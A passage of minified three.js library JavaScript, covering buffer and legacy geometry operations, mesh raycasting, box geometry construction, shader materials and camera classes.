Float32Array(i.length),3));else for(var n=t.normal.array,r=0,o=n.length;r<o;r++)n[r]=0;var a,s,c,l=t.normal.array,h=new y,u=new y,d=new y,p=new y,f=new y;if(e){var m=e.array;for(r=0,o=e.count;r<o;r+=3)a=3*m[r+0],s=3*m[r+1],c=3*m[r+2],h.fromArray(i,a),u.fromArray(i,s),d.fromArray(i,c),p.subVectors(d,u),f.subVectors(h,u),p.cross(f),l[a]+=p.x,l[a+1]+=p.y,l[a+2]+=p.z,l[s]+=p.x,l[s+1]+=p.y,l[s+2]+=p.z,l[c]+=p.x,l[c+1]+=p.y,l[c+2]+=p.z}else for(r=0,o=i.length;r<o;r+=9)h.fromArray(i,r),u.fromArray(i,r+3),d.fromArray(i,r+6),p.subVectors(d,u),f.subVectors(h,u),p.cross(f),l[r]=p.x,l[r+1]=p.y,l[r+2]=p.z,l[r+3]=p.x,l[r+4]=p.y,l[r+5]=p.z,l[r+6]=p.x,l[r+7]=p.y,l[r+8]=p.z;this.normalizeNormals(),t.normal.needsUpdate=!0}},merge:function(e,t){if(e&&e.isBufferGeometry){void 0===t&&(t=0,console.warn("THREE.BufferGeometry.merge(): Overwriting original geometry, starting at offset=0. Use BufferGeometryUtils.mergeBufferGeometries() for lossless merge."));var i=this.attributes;for(var n in i)if(void 0!==e.attributes[n])for(var r=i[n].array,o=e.attributes[n],a=o.array,s=o.itemSize*t,c=Math.min(a.length,r.length-s),l=0,h=s;l<c;l++,h++)r[h]=a[l];return this}console.error("THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.",e)},normalizeNormals:function(){for(var e=this.attributes.normal,t=0,i=e.count;t<i;t++)ut.x=e.getX(t),ut.y=e.getY(t),ut.z=e.getZ(t),ut.normalize(),e.setXYZ(t,ut.x,ut.y,ut.z)},toNonIndexed:function(){function e(e,t){for(var i=e.array,n=e.itemSize,r=new i.constructor(t.length*n),o=0,a=0,s=0,c=t.length;s<c;s++){o=t[s]*n;for(var l=0;l<n;l++)r[a++]=i[o++]}return new Xe(r,n)}if(null===this.index)return console.warn("THREE.BufferGeometry.toNonIndexed(): Geometry is already non-indexed."),this;var t=new dt,i=this.index.array,n=this.attributes;for(var r in n){var o=e(n[r],i);t.addAttribute(r,o)}var a=this.morphAttributes;for(r in a){for(var s=[],c=a[r],l=0,h=c.length;l<h;l++){o=e(c[l],i);s.push(o)}t.morphAttributes[r]=s}for(var u=this.groups,d=(l=0,u.length);l<d;l++){var p=u[l];t.addGroup(p.start,p.count,p.materialIndex)}return t},toJSON:function(){var e={metadata:{version:4.5,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,""!==this.name&&(e.name=this.name),Object.keys(this.userData).length>0&&(e.userData=this.userData),void 0!==this.parameters){var t=this.parameters;for(var i in t)void 0!==t[i]&&(e[i]=t[i]);return e}e.data={attributes:{}};var n=this.index;null!==n&&(e.data.index={type:n.array.constructor.name,array:Array.prototype.slice.call(n.array)});var r=this.attributes;for(var i in r){var o=(d=r[i]).toJSON();""!==d.name&&(o.name=d.name),e.data.attributes[i]=o}var a={},s=!1;for(var i in this.morphAttributes){for(var c=this.morphAttributes[i],l=[],h=0,u=c.length;h<u;h++){var d;o=(d=c[h]).toJSON();""!==d.name&&(o.name=d.name),l.push(o)}l.length>0&&(a[i]=l,s=!0)}s&&(e.data.morphAttributes=a);var p=this.groups;p.length>0&&(e.data.groups=JSON.parse(JSON.stringify(p)));var f=this.boundingSphere;return null!==f&&(e.data.boundingSphere={center:f.center.toArray(),radius:f.radius}),e},clone:function(){return(new dt).copy(this)},copy:function(e){var t,i,n;this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null,this.name=e.name;var r=e.index;null!==r&&this.setIndex(r.clone());var o=e.attributes;for(t in o){var a=o[t];this.addAttribute(t,a.clone())}var s=e.morphAttributes;for(t in s){var c=[],l=s[t];for(i=0,n=l.length;i<n;i++)c.push(l[i].clone());this.morphAttributes[t]=c}var h=e.groups;for(i=0,n=h.length;i<n;i++){var u=h[i];this.addGroup(u.start,u.count,u.materialIndex)}var d=e.boundingBox;null!==d&&(this.boundingBox=d.clone());var p=e.boundingSphere;return null!==p&&(this.boundingSphere=p.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this},dispose:function(){this.dispatchEvent({type:"dispose"})}});var pt=new B,ft=new Se,mt=new ve,vt=new y,gt=new y,yt=new y,bt=new y,wt=new y,xt=new y,_t=new y,Mt=new y,St=new y,Tt=new f,Et=new f,At=new f,Ct=new y,Pt=new y;function Lt(e,t){K.call(this),this.type="Mesh",this.geometry=void 0!==e?e:new dt,this.material=void 0!==t?t:new qe({color:16777215*Math.random()}),this.drawMode=0,this.updateMorphTargets()}function Rt(e,t,i,n,r,o,a,s){if(null===(1===t.side?n.intersectTriangle(a,o,r,!0,s):n.intersectTriangle(r,o,a,2!==t.side,s)))return null;Pt.copy(s),Pt.applyMatrix4(e.matrixWorld);var c=i.ray.origin.distanceTo(Pt);return c<i.near||c>i.far?null:{distance:c,point:Pt.clone(),object:e}}function kt(e,t,i,n,r,o,a,s,c,l,h){vt.fromBufferAttribute(r,c),gt.fromBufferAttribute(r,l),yt.fromBufferAttribute(r,h);var u=e.morphTargetInfluences;if(t.morphTargets&&o&&u){_t.set(0,0,0),Mt.set(0,0,0),St.set(0,0,0);for(var d=0,p=o.length;d<p;d++){var m=u[d],v=o[d];0!==m&&(bt.fromBufferAttribute(v,c),wt.fromBufferAttribute(v,l),xt.fromBufferAttribute(v,h),_t.addScaledVector(bt.sub(vt),m),Mt.addScaledVector(wt.sub(gt),m),St.addScaledVector(xt.sub(yt),m))}vt.add(_t),gt.add(Mt),yt.add(St)}var g=Rt(e,t,i,n,vt,gt,yt,Ct);if(g){a&&(Tt.fromBufferAttribute(a,c),Et.fromBufferAttribute(a,l),At.fromBufferAttribute(a,h),g.uv=Be.getUV(Ct,vt,gt,yt,Tt,Et,At,new f)),s&&(Tt.fromBufferAttribute(s,c),Et.fromBufferAttribute(s,l),At.fromBufferAttribute(s,h),g.uv2=Be.getUV(Ct,vt,gt,yt,Tt,Et,At,new f));var y=new He(c,l,h);Be.getNormal(vt,gt,yt,y.normal),g.face=y}return g}Lt.prototype=Object.assign(Object.create(K.prototype),{constructor:Lt,isMesh:!0,setDrawMode:function(e){this.drawMode=e},copy:function(e){return K.prototype.copy.call(this,e),this.drawMode=e.drawMode,void 0!==e.morphTargetInfluences&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),void 0!==e.morphTargetDictionary&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this},updateMorphTargets:function(){var e,t,i,n=this.geometry;if(n.isBufferGeometry){var r=n.morphAttributes,o=Object.keys(r);if(o.length>0){var a=r[o[0]];if(void 0!==a)for(this.morphTargetInfluences=[],this.morphTargetDictionary={},e=0,t=a.length;e<t;e++)i=a[e].name||String(e),this.morphTargetInfluences.push(0),this.morphTargetDictionary[i]=e}}else{var s=n.morphTargets;void 0!==s&&s.length>0&&console.error("THREE.Mesh.updateMorphTargets() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.")}},raycast:function(e,t){var i,n=this.geometry,r=this.material,o=this.matrixWorld;if(void 0!==r&&(null===n.boundingSphere&&n.computeBoundingSphere(),mt.copy(n.boundingSphere),mt.applyMatrix4(o),!1!==e.ray.intersectsSphere(mt)&&(pt.getInverse(o),ft.copy(e.ray).applyMatrix4(pt),null===n.boundingBox||!1!==ft.intersectsBox(n.boundingBox))))if(n.isBufferGeometry){var a,s,c,l,h,u,d,p,m,v=n.index,g=n.attributes.position,y=n.morphAttributes.position,b=n.attributes.uv,w=n.attributes.uv2,x=n.groups,_=n.drawRange;if(null!==v)if(Array.isArray(r))for(l=0,u=x.length;l<u;l++)for(m=r[(p=x[l]).materialIndex],h=Math.max(p.start,_.start),d=Math.min(p.start+p.count,_.start+_.count);h<d;h+=3)a=v.getX(h),s=v.getX(h+1),c=v.getX(h+2),(i=kt(this,m,e,ft,g,y,b,w,a,s,c))&&(i.faceIndex=Math.floor(h/3),i.face.materialIndex=p.materialIndex,t.push(i));else for(l=Math.max(0,_.start),u=Math.min(v.count,_.start+_.count);l<u;l+=3)a=v.getX(l),s=v.getX(l+1),c=v.getX(l+2),(i=kt(this,r,e,ft,g,y,b,w,a,s,c))&&(i.faceIndex=Math.floor(l/3),t.push(i));else if(void 0!==g)if(Array.isArray(r))for(l=0,u=x.length;l<u;l++)for(m=r[(p=x[l]).materialIndex],h=Math.max(p.start,_.start),d=Math.min(p.start+p.count,_.start+_.count);h<d;h+=3)(i=kt(this,m,e,ft,g,y,b,w,a=h,s=h+1,c=h+2))&&(i.faceIndex=Math.floor(h/3),i.face.materialIndex=p.materialIndex,t.push(i));else for(l=Math.max(0,_.start),u=Math.min(g.count,_.start+_.count);l<u;l+=3)(i=kt(this,r,e,ft,g,y,b,w,a=l,s=l+1,c=l+2))&&(i.faceIndex=Math.floor(l/3),t.push(i))}else if(n.isGeometry){var M,S,T,E,A=Array.isArray(r),C=n.vertices,P=n.faces,L=n.faceVertexUvs[0];L.length>0&&(E=L);for(var R=0,k=P.length;R<k;R++){var O=P[R],I=A?r[O.materialIndex]:r;if(void 0!==I&&(M=C[O.a],S=C[O.b],T=C[O.c],i=Rt(this,I,e,ft,M,S,T,Ct))){if(E&&E[R]){var B=E[R];Tt.copy(B[0]),Et.copy(B[1]),At.copy(B[2]),i.uv=Be.getUV(Ct,M,S,T,Tt,Et,At,new f)}i.face=O,i.faceIndex=R,t.push(i)}}}},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var Ot=0,It=new B,Bt=new K,Dt=new y;function zt(){Object.defineProperty(this,"id",{value:Ot+=2}),this.uuid=p.generateUUID(),this.name="",this.type="Geometry",this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.elementsNeedUpdate=!1,this.verticesNeedUpdate=!1,this.uvsNeedUpdate=!1,this.normalsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.lineDistancesNeedUpdate=!1,this.groupsNeedUpdate=!1}zt.prototype=Object.assign(Object.create(h.prototype),{constructor:zt,isGeometry:!0,applyMatrix:function(e){for(var t=(new x).getNormalMatrix(e),i=0,n=this.vertices.length;i<n;i++){this.vertices[i].applyMatrix4(e)}for(i=0,n=this.faces.length;i<n;i++){var r=this.faces[i];r.normal.applyMatrix3(t).normalize();for(var o=0,a=r.vertexNormals.length;o<a;o++)r.vertexNormals[o].applyMatrix3(t).normalize()}return null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this.verticesNeedUpdate=!0,this.normalsNeedUpdate=!0,this},rotateX:function(e){return It.makeRotationX(e),this.applyMatrix(It),this},rotateY:function(e){return It.makeRotationY(e),this.applyMatrix(It),this},rotateZ:function(e){return It.makeRotationZ(e),this.applyMatrix(It),this},translate:function(e,t,i){return It.makeTranslation(e,t,i),this.applyMatrix(It),this},scale:function(e,t,i){return It.makeScale(e,t,i),this.applyMatrix(It),this},lookAt:function(e){return Bt.lookAt(e),Bt.updateMatrix(),this.applyMatrix(Bt.matrix),this},fromBufferGeometry:function(e){var t=this,i=null!==e.index?e.index.array:void 0,n=e.attributes;if(void 0===n.position)return console.error("THREE.Geometry.fromBufferGeometry(): Position attribute required for conversion."),this;var r=n.position.array,o=void 0!==n.normal?n.normal.array:void 0,a=void 0!==n.color?n.color.array:void 0,s=void 0!==n.uv?n.uv.array:void 0,c=void 0!==n.uv2?n.uv2.array:void 0;void 0!==c&&(this.faceVertexUvs[1]=[]);for(var l=0;l<r.length;l+=3)t.vertices.push((new y).fromArray(r,l)),void 0!==a&&t.colors.push((new Ne).fromArray(a,l));function h(e,i,n,r){var l=void 0===a?[]:[t.colors[e].clone(),t.colors[i].clone(),t.colors[n].clone()],h=new He(e,i,n,void 0===o?[]:[(new y).fromArray(o,3*e),(new y).fromArray(o,3*i),(new y).fromArray(o,3*n)],l,r);t.faces.push(h),void 0!==s&&t.faceVertexUvs[0].push([(new f).fromArray(s,2*e),(new f).fromArray(s,2*i),(new f).fromArray(s,2*n)]),void 0!==c&&t.faceVertexUvs[1].push([(new f).fromArray(c,2*e),(new f).fromArray(c,2*i),(new f).fromArray(c,2*n)])}var u=e.groups;if(u.length>0)for(l=0;l<u.length;l++)for(var d=u[l],p=d.start,m=p,v=p+d.count;m<v;m+=3)void 0!==i?h(i[m],i[m+1],i[m+2],d.materialIndex):h(m,m+1,m+2,d.materialIndex);else if(void 0!==i)for(l=0;l<i.length;l+=3)h(i[l],i[l+1],i[l+2]);else for(l=0;l<r.length/3;l+=3)h(l,l+1,l+2);return this.computeFaceNormals(),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),this},center:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(Dt).negate(),this.translate(Dt.x,Dt.y,Dt.z),this},normalize:function(){this.computeBoundingSphere();var e=this.boundingSphere.center,t=this.boundingSphere.radius,i=0===t?1:1/t,n=new B;return n.set(i,0,0,-i*e.x,0,i,0,-i*e.y,0,0,i,-i*e.z,0,0,0,1),this.applyMatrix(n),this},computeFaceNormals:function(){for(var e=new y,t=new y,i=0,n=this.faces.length;i<n;i++){var r=this.faces[i],o=this.vertices[r.a],a=this.vertices[r.b],s=this.vertices[r.c];e.subVectors(s,a),t.subVectors(o,a),e.cross(t),e.normalize(),r.normal.copy(e)}},computeVertexNormals:function(e){var t,i,n,r,o,a;for(void 0===e&&(e=!0),a=new Array(this.vertices.length),t=0,i=this.vertices.length;t<i;t++)a[t]=new y;if(e){var s,c,l,h=new y,u=new y;for(n=0,r=this.faces.length;n<r;n++)o=this.faces[n],s=this.vertices[o.a],c=this.vertices[o.b],l=this.vertices[o.c],h.subVectors(l,c),u.subVectors(s,c),h.cross(u),a[o.a].add(h),a[o.b].add(h),a[o.c].add(h)}else for(this.computeFaceNormals(),n=0,r=this.faces.length;n<r;n++)a[(o=this.faces[n]).a].add(o.normal),a[o.b].add(o.normal),a[o.c].add(o.normal);for(t=0,i=this.vertices.length;t<i;t++)a[t].normalize();for(n=0,r=this.faces.length;n<r;n++){var d=(o=this.faces[n]).vertexNormals;3===d.length?(d[0].copy(a[o.a]),d[1].copy(a[o.b]),d[2].copy(a[o.c])):(d[0]=a[o.a].clone(),d[1]=a[o.b].clone(),d[2]=a[o.c].clone())}this.faces.length>0&&(this.normalsNeedUpdate=!0)},computeFlatVertexNormals:function(){var e,t,i;for(this.computeFaceNormals(),e=0,t=this.faces.length;e<t;e++){var n=(i=this.faces[e]).vertexNormals;3===n.length?(n[0].copy(i.normal),n[1].copy(i.normal),n[2].copy(i.normal)):(n[0]=i.normal.clone(),n[1]=i.normal.clone(),n[2]=i.normal.clone())}this.faces.length>0&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var e,t,i,n,r;for(i=0,n=this.faces.length;i<n;i++)for((r=this.faces[i]).__originalFaceNormal?r.__originalFaceNormal.copy(r.normal):r.__originalFaceNormal=r.normal.clone(),r.__originalVertexNormals||(r.__originalVertexNormals=[]),e=0,t=r.vertexNormals.length;e<t;e++)r.__originalVertexNormals[e]?r.__originalVertexNormals[e].copy(r.vertexNormals[e]):r.__originalVertexNormals[e]=r.vertexNormals[e].clone();var o=new zt;for(o.faces=this.faces,e=0,t=this.morphTargets.length;e<t;e++){if(!this.morphNormals[e]){this.morphNormals[e]={},this.morphNormals[e].faceNormals=[],this.morphNormals[e].vertexNormals=[];var a=this.morphNormals[e].faceNormals,s=this.morphNormals[e].vertexNormals;for(i=0,n=this.faces.length;i<n;i++)c=new y,l={a:new y,b:new y,c:new y},a.push(c),s.push(l)}var c,l,h=this.morphNormals[e];for(o.vertices=this.morphTargets[e].vertices,o.computeFaceNormals(),o.computeVertexNormals(),i=0,n=this.faces.length;i<n;i++)r=this.faces[i],c=h.faceNormals[i],l=h.vertexNormals[i],c.copy(r.normal),l.a.copy(r.vertexNormals[0]),l.b.copy(r.vertexNormals[1]),l.c.copy(r.vertexNormals[2])}for(i=0,n=this.faces.length;i<n;i++)(r=this.faces[i]).normal=r.__originalFaceNormal,r.vertexNormals=r.__originalVertexNormals},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new pe),this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new ve),this.boundingSphere.setFromPoints(this.vertices)},merge:function(e,t,i){if(e&&e.isGeometry){var n,r=this.vertices.length,o=this.vertices,a=e.vertices,s=this.faces,c=e.faces,l=this.colors,h=e.colors;void 0===i&&(i=0),void 0!==t&&(n=(new x).getNormalMatrix(t));for(var u=0,d=a.length;u<d;u++){var p=a[u].clone();void 0!==t&&p.applyMatrix4(t),o.push(p)}for(u=0,d=h.length;u<d;u++)l.push(h[u].clone());for(u=0,d=c.length;u<d;u++){var f,m,v,g=c[u],y=g.vertexNormals,b=g.vertexColors;(f=new He(g.a+r,g.b+r,g.c+r)).normal.copy(g.normal),void 0!==n&&f.normal.applyMatrix3(n).normalize();for(var w=0,_=y.length;w<_;w++)m=y[w].clone(),void 0!==n&&m.applyMatrix3(n).normalize(),f.vertexNormals.push(m);f.color.copy(g.color);for(w=0,_=b.length;w<_;w++)v=b[w],f.vertexColors.push(v.clone());f.materialIndex=g.materialIndex+i,s.push(f)}for(u=0,d=e.faceVertexUvs.length;u<d;u++){var M=e.faceVertexUvs[u];void 0===this.faceVertexUvs[u]&&(this.faceVertexUvs[u]=[]);for(w=0,_=M.length;w<_;w++){for(var S=M[w],T=[],E=0,A=S.length;E<A;E++)T.push(S[E].clone());this.faceVertexUvs[u].push(T)}}}else console.error("THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.",e)},mergeMesh:function(e){e&&e.isMesh?(e.matrixAutoUpdate&&e.updateMatrix(),this.merge(e.geometry,e.matrix)):console.error("THREE.Geometry.mergeMesh(): mesh not an instance of THREE.Mesh.",e)},mergeVertices:function(){var e,t,i,n,r,o,a,s,c={},l=[],h=[],u=Math.pow(10,4);for(i=0,n=this.vertices.length;i<n;i++)e=this.vertices[i],void 0===c[t=Math.round(e.x*u)+"_"+Math.round(e.y*u)+"_"+Math.round(e.z*u)]?(c[t]=i,l.push(this.vertices[i]),h[i]=l.length-1):h[i]=h[c[t]];var d=[];for(i=0,n=this.faces.length;i<n;i++){(r=this.faces[i]).a=h[r.a],r.b=h[r.b],r.c=h[r.c],o=[r.a,r.b,r.c];for(var p=0;p<3;p++)if(o[p]===o[(p+1)%3]){d.push(i);break}}for(i=d.length-1;i>=0;i--){var f=d[i];for(this.faces.splice(f,1),a=0,s=this.faceVertexUvs.length;a<s;a++)this.faceVertexUvs[a].splice(f,1)}var m=this.vertices.length-l.length;return this.vertices=l,m},setFromPoints:function(e){this.vertices=[];for(var t=0,i=e.length;t<i;t++){var n=e[t];this.vertices.push(new y(n.x,n.y,n.z||0))}return this},sortFacesByMaterialIndex:function(){for(var e=this.faces,t=e.length,i=0;i<t;i++)e[i]._id=i;e.sort((function(e,t){return e.materialIndex-t.materialIndex}));var n,r,o=this.faceVertexUvs[0],a=this.faceVertexUvs[1];o&&o.length===t&&(n=[]),a&&a.length===t&&(r=[]);for(i=0;i<t;i++){var s=e[i]._id;n&&n.push(o[s]),r&&r.push(a[s])}n&&(this.faceVertexUvs[0]=n),r&&(this.faceVertexUvs[1]=r)},toJSON:function(){var e={metadata:{version:4.5,type:"Geometry",generator:"Geometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,""!==this.name&&(e.name=this.name),void 0!==this.parameters){var t=this.parameters;for(var i in t)void 0!==t[i]&&(e[i]=t[i]);return e}for(var n=[],r=0;r<this.vertices.length;r++){var o=this.vertices[r];n.push(o.x,o.y,o.z)}var a=[],s=[],c={},l=[],h={},u=[],d={};for(r=0;r<this.faces.length;r++){var p=this.faces[r],f=void 0!==this.faceVertexUvs[0][r],m=p.normal.length()>0,v=p.vertexNormals.length>0,g=1!==p.color.r||1!==p.color.g||1!==p.color.b,y=p.vertexColors.length>0,b=0;if(b=M(b,0,0),b=M(b,1,!0),b=M(b,2,!1),b=M(b,3,f),b=M(b,4,m),b=M(b,5,v),b=M(b,6,g),b=M(b,7,y),a.push(b),a.push(p.a,p.b,p.c),a.push(p.materialIndex),f){var w=this.faceVertexUvs[0][r];a.push(E(w[0]),E(w[1]),E(w[2]))}if(m&&a.push(S(p.normal)),v){var x=p.vertexNormals;a.push(S(x[0]),S(x[1]),S(x[2]))}if(g&&a.push(T(p.color)),y){var _=p.vertexColors;a.push(T(_[0]),T(_[1]),T(_[2]))}}function M(e,t,i){return i?e|1<<t:e&~(1<<t)}function S(e){var t=e.x.toString()+e.y.toString()+e.z.toString();return void 0!==c[t]?c[t]:(c[t]=s.length/3,s.push(e.x,e.y,e.z),c[t])}function T(e){var t=e.r.toString()+e.g.toString()+e.b.toString();return void 0!==h[t]?h[t]:(h[t]=l.length,l.push(e.getHex()),h[t])}function E(e){var t=e.x.toString()+e.y.toString();return void 0!==d[t]?d[t]:(d[t]=u.length/2,u.push(e.x,e.y),d[t])}return e.data={},e.data.vertices=n,e.data.normals=s,l.length>0&&(e.data.colors=l),u.length>0&&(e.data.uvs=[u]),e.data.faces=a,e},clone:function(){return(new zt).copy(this)},copy:function(e){var t,i,n,r,o,a;this.vertices=[],this.colors=[],this.faces=[],this.faceVertexUvs=[[]],this.morphTargets=[],this.morphNormals=[],this.skinWeights=[],this.skinIndices=[],this.lineDistances=[],this.boundingBox=null,this.boundingSphere=null,this.name=e.name;var s=e.vertices;for(t=0,i=s.length;t<i;t++)this.vertices.push(s[t].clone());var c=e.colors;for(t=0,i=c.length;t<i;t++)this.colors.push(c[t].clone());var l=e.faces;for(t=0,i=l.length;t<i;t++)this.faces.push(l[t].clone());for(t=0,i=e.faceVertexUvs.length;t<i;t++){var h=e.faceVertexUvs[t];for(void 0===this.faceVertexUvs[t]&&(this.faceVertexUvs[t]=[]),n=0,r=h.length;n<r;n++){var u=h[n],d=[];for(o=0,a=u.length;o<a;o++){var p=u[o];d.push(p.clone())}this.faceVertexUvs[t].push(d)}}var f=e.morphTargets;for(t=0,i=f.length;t<i;t++){var m={};if(m.name=f[t].name,void 0!==f[t].vertices)for(m.vertices=[],n=0,r=f[t].vertices.length;n<r;n++)m.vertices.push(f[t].vertices[n].clone());if(void 0!==f[t].normals)for(m.normals=[],n=0,r=f[t].normals.length;n<r;n++)m.normals.push(f[t].normals[n].clone());this.morphTargets.push(m)}var v=e.morphNormals;for(t=0,i=v.length;t<i;t++){var g={};if(void 0!==v[t].vertexNormals)for(g.vertexNormals=[],n=0,r=v[t].vertexNormals.length;n<r;n++){var y=v[t].vertexNormals[n],b={};b.a=y.a.clone(),b.b=y.b.clone(),b.c=y.c.clone(),g.vertexNormals.push(b)}if(void 0!==v[t].faceNormals)for(g.faceNormals=[],n=0,r=v[t].faceNormals.length;n<r;n++)g.faceNormals.push(v[t].faceNormals[n].clone());this.morphNormals.push(g)}var w=e.skinWeights;for(t=0,i=w.length;t<i;t++)this.skinWeights.push(w[t].clone());var x=e.skinIndices;for(t=0,i=x.length;t<i;t++)this.skinIndices.push(x[t].clone());var _=e.lineDistances;for(t=0,i=_.length;t<i;t++)this.lineDistances.push(_[t]);var M=e.boundingBox;null!==M&&(this.boundingBox=M.clone());var S=e.boundingSphere;return null!==S&&(this.boundingSphere=S.clone()),this.elementsNeedUpdate=e.elementsNeedUpdate,this.verticesNeedUpdate=e.verticesNeedUpdate,this.uvsNeedUpdate=e.uvsNeedUpdate,this.normalsNeedUpdate=e.normalsNeedUpdate,this.colorsNeedUpdate=e.colorsNeedUpdate,this.lineDistancesNeedUpdate=e.lineDistancesNeedUpdate,this.groupsNeedUpdate=e.groupsNeedUpdate,this},dispose:function(){this.dispatchEvent({type:"dispose"})}});class Ft extends dt{constructor(e,t,i,n,r,o){super(),this.type="BoxBufferGeometry",this.parameters={width:e,height:t,depth:i,widthSegments:n,heightSegments:r,depthSegments:o};var a=this;e=e||1,t=t||1,i=i||1,n=Math.floor(n)||1,r=Math.floor(r)||1,o=Math.floor(o)||1;var s=[],c=[],l=[],h=[],u=0,d=0;function p(e,t,i,n,r,o,p,f,m,v,g){var b,w,x=o/m,_=p/v,M=o/2,S=p/2,T=f/2,E=m+1,A=v+1,C=0,P=0,L=new y;for(w=0;w<A;w++){var R=w*_-S;for(b=0;b<E;b++){var k=b*x-M;L[e]=k*n,L[t]=R*r,L[i]=T,c.push(L.x,L.y,L.z),L[e]=0,L[t]=0,L[i]=f>0?1:-1,l.push(L.x,L.y,L.z),h.push(b/m),h.push(1-w/v),C+=1}}for(w=0;w<v;w++)for(b=0;b<m;b++){var O=u+b+E*w,I=u+b+E*(w+1),B=u+(b+1)+E*(w+1),D=u+(b+1)+E*w;s.push(O,I,D),s.push(I,B,D),P+=6}a.addGroup(d,P,g),d+=P,u+=C}p("z","y","x",-1,-1,i,t,e,o,r,0),p("z","y","x",1,-1,i,t,-e,o,r,1),p("x","z","y",1,1,e,i,t,n,o,2),p("x","z","y",1,-1,e,i,-t,n,o,3),p("x","y","z",1,-1,e,t,i,n,r,4),p("x","y","z",-1,-1,e,t,-i,n,r,5),this.setIndex(s),this.addAttribute("position",new tt(c,3)),this.addAttribute("normal",new tt(l,3)),this.addAttribute("uv",new tt(h,2))}}function Nt(e){var t={};for(var i in e)for(var n in t[i]={},e[i]){var r=e[i][n];r&&(r.isColor||r.isMatrix3||r.isMatrix4||r.isVector2||r.isVector3||r.isVector4||r.isTexture)?t[i][n]=r.clone():Array.isArray(r)?t[i][n]=r.slice():t[i][n]=r}return t}function jt(e){for(var t={},i=0;i<e.length;i++){var n=Nt(e[i]);for(var r in n)t[r]=n[r]}return t}var Ut={clone:Nt,merge:jt};function Vt(e){We.call(this),this.type="ShaderMaterial",this.defines={},this.uniforms={},this.vertexShader="void main() {\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",this.fragmentShader="void main() {\n\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}",this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,void 0!==e&&(void 0!==e.attributes&&console.error("THREE.ShaderMaterial: attributes should now be defined in THREE.BufferGeometry instead."),this.setValues(e))}function Ht(){K.call(this),this.type="Camera",this.matrixWorldInverse=new B,this.projectionMatrix=new B,this.projectionMatrixInverse=new B}function Gt(e,t,i,n){Ht.call(this),this.type="PerspectiveCamera",this.fov=void 0!==e?e:50,this.zoom=1,this.near=void 0!==i?i:.1,this.far=void 0!==n?n:2e3,this.focus=10,this.aspect=void 0!==t?t:1,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}Vt.prototype=Object.create(We.prototype),Vt.prototype.constructor=Vt,Vt.prototype.isShaderMaterial=!0,Vt.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=Nt(e.uniforms),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.lights=e.lights,this.clipping=e.clipping,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this.extensions=e.extensions,this},Vt.prototype.toJSON=function(e){var t=We.prototype.toJSON.call(this,e);for(var i in t.uniforms={},this.uniforms){var n=this.uniforms[i].value;n&&n.isTexture?t.uniforms[i]={type:"t",value:n.toJSON(e).uuid}:n&&n.isColor?t.uniforms[i]={type:"c",value:n.getHex()}:n&&n.isVector2?t.uniforms[i]={type:"v2",value:n.toArray()}:n&&n.isVector3?t.uniforms[i]={type:"v3",value:n.toArray()}:n&&n.isVector4?t.uniforms[i]={type:"v4",value:n.toArray()}:n&&n.isMatrix3?t.uniforms[i]={type:"m3",value:n.toArray()}:n&&n.isMatrix4?t.uniforms[i]={type:"m4",value:n.toArray()}:t.uniforms[i]={value:n}}Object.keys(this.defines).length>0&&(t.defines=this.defines),t.vertexShader=this.vertexShader,t.fragmentShader=this.fragmentShader;var r={};for(var o in this.extensions)!0===this.extensions[o]&&(r[o]=!0);return Object.keys(r).length>0&&(t.extensions=r),t},Ht.prototype=Object.assign(Object.create(K.prototype),{constructor:Ht,isCamera:!0,copy:function(e,t){return K.prototype.copy.call(this,e,t),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this},getWorldDirection:function(e){void 0===e&&(console.warn("THREE.Camera: .getWorldDirection() target is now required"),e=new y),this.updateMatrixWorld(!0);var t=this.matrixWorld.elements;return e.set(-t[8],-t[9],-t[10]).normalize()},updateMatrixWorld:function(e){K.prototype.updateMatrixWorld.call(this,e),this.matrixWorldInverse.getInverse(this.matrixWorld)},clone:function(){return(new this.constructor).copy(this)}}),Gt.prototype=Object.assign(Object.create(Ht.prototype),{constructor:Gt,isPerspectiveCamera:!0,copy:function(e,t){return 